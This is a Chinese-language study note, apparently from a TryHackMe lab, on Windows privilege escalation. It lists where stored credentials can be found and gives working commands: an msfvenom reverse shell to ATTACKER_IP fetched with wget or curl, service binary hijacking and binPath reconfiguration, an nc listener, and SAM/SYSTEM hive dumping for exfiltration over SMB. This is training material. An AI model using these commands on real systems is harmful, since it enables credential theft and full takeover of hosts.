---
{"dg-publish":true,"dg-path":"THM/windows提权.md","permalink":"/THM/windows提权/","title":"windows提权"}
---

```table-of-contents
```
# 用户

Windows系统主要有两类用户。
+ **管理员**
	+ 这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。
+ **标准用户**
	+ 这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。

除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户：

+ **系统/本地系统**
	+ 操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，**并且具有比管理员更高的权限**。
+ **本地服务**
	+ 用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。
+ **网络服务**
	+ 用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。




# 敏感信息位置

## 无人值守的 Windows 安装
在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

作为这些文件的一部分，您可能会遇到凭据：
```html
shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```


## Powershell 历史

每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在`cmd.exe`提示符下使用以下命令来检索该密码：

```shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将`%userprofile%`识别为环境变量。要从 Powershell 读取该文件，您必须将`%userprofile%`替换为`$Env:userprofile` 。



## 保存的 Windows 凭据
Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据：

```shell
cmdkey /list
```

虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，您可以将它们与runas命令和/savecred选项一起使用，如下所示。
```shell
runas /savecred /user:admin(这个admin是用户名) cmd.exe
```

## IIS 配置

Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为`web.config`的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


## 从软件检索凭证：PuTTY
PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其SSH密码，但它将存储包含明文身份验证凭据的代理配置。

要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：

```shell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、 SSH客户端、VNC 软件等，都将有方法恢复用户保存的任何密码



# 利用错误的服务配置

Windows 服务由**服务控制管理器**(SCM) 管理。
Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。
需要注意的是，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。

+ 用`sc qc  <服务的实际名称> `来查看某个服务信息
+ 用`sc query`来查看所有服务



## 服务可执行文件的不正确权限

![Pasted image 20241117205023.png](/img/user/picture/Pasted%20image%2020241117205023.png)

可以看到有用户`svcusr1`执行`C:\PROGRA~2\SYSTEM~1\WService.exe`文件
查看文件权限：
![Pasted image 20241117205216.png](/img/user/picture/Pasted%20image%2020241117205216.png)
发现有修改权限（M），我么可以生成其他文件来覆盖他，

在攻击机上利用`msfvenom`来生成：
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
之后用python开启web服务，来使受害机访问下载攻击文件：
```shell
python3 -m http.server 
```

```shell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

然后就可以将攻击文件进行替换：
```shell
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
//修改权限
```


在攻击机上监听等待即可
```shell
nc -lvp 4445
```



## 不正确路径(未加引号)

![Pasted image 20241117213924.png](/img/user/picture/Pasted%20image%2020241117213924.png)
看到有：
```
BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个：

+ 命令:`C:\MyPrograms\Disk.exe`
	+ 参数:`Sorter` `Enterprise\bin\disksrs.exe`
+ 命令:`C:\MyPrograms\Disk Sorter.exe`
	+ 参数:`Enterprise\bin\disksrs.exe`
+ 命令:`C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

还有，大多数文件写在`C:\Program Files`或`C:\Program Files (x86)`中，非特权用户无法写入
但是这里安装在`c:\MyPrograms`下。默认情况下，它继承`C:\`目录的权限，允许任何用户在其中创建文件和文件夹。

所以这里我们就可以将恶意文件修改为`C:\MyPrograms\Disk.exe`

## 不安全的服务权限

如果服务的可执行文件的DACL（权限）没有问题，并且路径也没啥问题

可以检查一下**服务本身的DACL（权限）**

要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的[Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) 。
```shell
accesschk64.exe -qlc thmservice
```
![Pasted image 20241123144759.png](/img/user/picture/Pasted%20image%2020241123144759.png)
可以看到任何用户都有SERVICE_ALL_ACCESS权限，都可以重新配置服务

下面构建另一个 exe-service 反向 shell
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

python3 -m http.server 


nc -lvnp 4447
```


```shell
curl http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe


icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```


# 滥用特权

## windows特权
查看特权：
```shell-session
whoami /priv
```

https://github.com/gtworek/Priv2Admin
这个项目列举了一些对于攻击者有用的特权


## SeBackup / SeRestore

SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何DACL 。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。

有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。

注意（管理员身份启动）
![Pasted image 20241123155912.png](/img/user/picture/Pasted%20image%2020241123155912.png)

要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：
```shell
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```
这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的`smbserver.py`在 AttackBox 的当前目录中启动一个带有网络共享的简单SMB服务器：
```shell
mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```




